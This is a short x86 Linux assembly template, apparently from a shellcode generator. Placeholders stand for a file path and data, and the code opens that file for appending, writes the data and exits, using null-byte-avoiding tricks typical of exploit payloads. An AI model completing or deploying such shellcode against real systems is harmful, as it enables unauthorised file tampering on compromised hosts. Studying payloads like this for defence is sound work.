push   $0x5
pop    %eax
{0}
{1}
mov    %esp,%ebx
push   $0x4014141
pop    %ecx
shr    $0x10,%ecx
int    $0x80
mov    %eax,%ebx
push   $0x4
pop    %eax
{2}
mov %esp,%ecx
{3}
int    $0x80
mov    $0x1,%al
mov    $0x1,%bl
int    $0x80